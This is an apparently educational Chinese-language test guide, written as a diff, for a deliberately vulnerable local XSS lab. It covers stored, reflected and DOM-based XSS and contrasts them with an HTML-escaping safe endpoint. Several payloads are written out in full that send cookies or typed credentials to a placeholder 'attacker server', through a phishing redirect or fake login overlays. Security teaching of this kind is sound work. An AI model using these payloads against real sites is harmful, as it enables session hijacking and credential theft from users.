@@ -1,0 +1,112 @@
+一、存储型 XSS 测试（核心，依赖真实 MySQL 数据库）
+存储型 XSS 是生产环境最常见、危害最大的 XSS 类型，恶意脚本会被持久化存储到 MySQL，任何用户查询评论时都会触发。
+1. 提交恶意评论（写入 MySQL）
+   请求方式：POST
+   URL：http://localhost:9001/target/xss/submit-comment
+   请求头：Content-Type: application/json
+   请求体：
+   json
+   {
+   "content": "<script>alert('XSS攻击：窃取Cookie = ' + document.cookie)</script>"
+   }
+   预期效果：
+   响应中返回包含恶意脚本的评论内容；
+   MySQL 的sys_comment表中新增一条记录，content字段为未转义的恶意脚本；
+   日志中打印【存储型XSS漏洞】向MySQL插入未过滤的恶意评论。
+   攻击说明：攻击者提交恶意脚本，所有访问评论列表的用户都会触发 XSS，窃取 Cookie。
+
+2. 查询评论列表（触发存储型 XSS）
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/list-comments
+   预期效果：
+   响应中返回包含恶意脚本的评论列表；
+   前端渲染时会执行脚本，弹出alert('XSS攻击：窃取Cookie = ...')；
+   日志中打印【存储型XSS漏洞】从MySQL读取未过滤的恶意评论。
+   攻击说明：存储型 XSS 的危害在于 “一次提交，多次触发”，所有访问评论列表的用户都会中招。
+
+3. 提交钓鱼脚本（进阶攻击）
+   请求方式：POST
+   URL：http://localhost:9001/target/xss/submit-comment
+   请求头：Content-Type: application/json
+   请求体：
+   json
+   {
+   "content": "<script>window.location.href='http://恶意钓鱼网站?cookie=' + encodeURIComponent(document.cookie)</script>"
+   }
+   预期效果：
+   提交成功后，访问评论列表的用户会被自动跳转到恶意钓鱼网站，并携带 Cookie；
+   攻击者可利用钓鱼网站窃取用户账号密码。
+   二、反射型 XSS 测试（无数据库依赖，URL 参数直接反射）
+   反射型 XSS 通过诱骗用户点击含恶意参数的 URL 触发，常见于搜索框、跳转链接等场景。
+
+1. 基础弹窗攻击
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/search?keyword=<script>alert('反射型XSS攻击')</script>
+   预期效果：
+   响应中直接返回包含恶意脚本的搜索结果；
+   前端渲染时弹出alert('反射型XSS攻击')；
+   日志中打印【反射型XSS漏洞】接收未过滤的搜索关键词。
+   攻击说明：攻击者构造恶意 URL，诱骗用户点击，触发 XSS。
+
+2. 窃取 Cookie 并跳转
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/search?keyword=<script>fetch('http://攻击者服务器/steal?cookie='+document.cookie);window.location.href='https://www.baidu.com';</script>
+   预期效果：
+   用户点击 URL 后，Cookie 会被发送到攻击者服务器；
+   页面自动跳转到百度，掩盖攻击行为。
+
+3. 钓鱼弹窗（伪装登录）
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/search?keyword=<script>document.write('<h3>会话已过期，请重新登录：</h3><input type="text" placeholder="账号"><input type="password" placeholder="密码"><button onclick="fetch(\'http://攻击者服务器/login?user=\'+this.previousElementSibling.previousElementSibling.value+\'&pwd=\'+this.previousElementSibling.value)">登录</button>');</script>
+   预期效果：
+   页面弹出伪造的登录框，用户输入的账号密码会被发送到攻击者服务器；
+   攻击隐蔽性强，用户易受骗。
+   三、DOM 型 XSS 测试（无数据库依赖，前端 DOM 渲染触发）
+   DOM 型 XSS 的恶意脚本由前端 DOM 操作执行，后端响应无异常，更隐蔽。
+
+1. 图片加载失败触发脚本
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/profile?username=<img src=x onerror="alert('DOM型XSS攻击：窃取Cookie = ' + document.cookie)">
+   预期效果：
+   响应中返回包含恶意 HTML 片段的用户资料；
+   前端渲染时，图片加载失败触发onerror脚本，弹出窃取 Cookie 的弹窗；
+   日志中打印【DOM型XSS漏洞】接收未过滤的用户名。
+   攻击说明：后端无法检测到恶意脚本，攻击更隐蔽。
+
+2. 伪造页面内容（钓鱼）
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/profile?username=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"><h3>系统维护，请输入账号密码：</h3><input type="text" placeholder="账号"><input type="password" placeholder="密码"><button onclick="fetch('http://攻击者服务器/steal?user='+this.previousElementSibling.previousElementSibling.value+'&pwd='+this.previousElementSibling.value)">提交</button></div>
+   预期效果：
+   页面被伪造的登录框覆盖，用户输入的账号密码会被发送到攻击者服务器；
+   攻击完全由前端执行，后端无感知。
+   四、安全防护接口测试（对比验证防护效果）
+   安全接口通过转义 HTML 特殊字符，有效防护 XSS 攻击，与漏洞接口形成鲜明对比。
+
+1. 提交恶意脚本（安全接口）
+   请求方式：POST
+   URL：http://localhost:9001/target/xss/safe-submit-comment
+   请求头：Content-Type: application/json
+   请求体：
+   json
+   {
+   "content": "<script>alert('XSS攻击')</script>"
+   }
+   预期效果：
+   响应中返回转义后的内容：&lt;script&gt;alert('XSS攻击')&lt;/script&gt;；
+   MySQL 的sys_comment表中存储的是转义后的安全内容；
+   前端渲染时不会执行脚本，仅显示纯文本；
+   日志中打印【安全接口】向MySQL插入转义后的评论。
+   防护说明：转义 HTML 特殊字符（<→&lt;、>→&gt;等），是防护 XSS 攻击的核心手段。
+
+2. 查询安全评论（验证防护效果）
+   请求方式：GET
+   URL：http://localhost:9001/target/xss/list-comments
+   预期效果：
+   响应中返回转义后的评论内容；
+   前端渲染时不会执行脚本，仅显示纯文本，有效防护 XSS 攻击。
+
+   五、测试注意事项
+   环境安全：所有测试请在本地 / 隔离测试环境中进行，避免在生产环境执行恶意脚本；
+   浏览器验证：建议在浏览器中访问反射型 / DOM 型 XSS 的 URL，能直观看到脚本执行效果；
+   数据库备份：测试存储型 XSS 前，建议备份sys_comment表，避免恶意脚本污染测试数据；
+   防护核心：XSS 防护的核心是 “输入过滤、输出转义”，安全接口的escapeHtml方法是生产环境的标准实现。
